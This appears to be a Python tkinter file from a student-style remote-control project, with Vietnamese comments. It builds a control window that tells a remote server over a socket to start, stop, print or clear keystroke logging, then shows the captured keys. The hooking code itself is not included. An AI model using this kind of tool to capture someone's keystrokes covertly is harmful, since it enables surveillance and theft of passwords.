import tkinter as tk
from keylogger import Keylogger
from tkinter import scrolledtext
class KeyloggerUI(Keylogger):
    def __init__(self, socket, window):
        super().__init__(socket, window)
        self.keystroke_window = tk.Toplevel(self.window)
        self.keystroke_window.title("Keystroke Logger")
        self.keystroke_window.geometry("400x270")

        frame_keylog = tk.Frame(self.keystroke_window)
        frame_keylog.grid(row=0, column=0, columnspan=4, padx=10, pady=10)

        self.keylog_text = scrolledtext.ScrolledText(frame_keylog, width=45, height=10)
        self.keylog_text.pack(padx=5, pady=5)
    
        hook_button = tk.Button(self.keystroke_window, text="Hook", command=self.start_keylogger, width=11, height=3)
        hook_button.place(x=18, y=195)
        unhook_button = tk.Button(self.keystroke_window, text="Unhook", command=self.stop_keylogger, width=11, height=3)
        unhook_button.place(x=110, y=195)
        print_button = tk.Button(self.keystroke_window, text="In Phím", command=self.print_keylog, width=11, height=3)
        print_button.place(x=202, y=195)
        clear_button = tk.Button(self.keystroke_window, text="Xóa", command=self.clear_keylog, width=11, height=3)
        clear_button.place(x=294, y=195)

    def start_keylogger(self):
        self.send_message("start")

    def stop_keylogger(self):
        self.send_message("stop")

    def print_keylog(self):
        self.send_message("print")
        response = self.socket.recv(1024).decode()  # Đọc dữ liệu từ server
        print(response)
        if response:
            self.keylog_text.delete(1.0, tk.END)  # Xóa bất kỳ dữ liệu cũ nào trong ô text
            self.keylog_text.insert(tk.END, response)  # Hiển thị dữ liệu keylog trong ô text
    
    def clear_keylog(self):
        self.send_message("clear")

    def send_message(self, message):
        if not self.socket:
            print("Not connected to the server.")
            return
        try:
            # Send a message to the server
            self.socket.sendall(message.encode())
            print("Message sent.")
        except OSError:
            print("Failed to send the message.")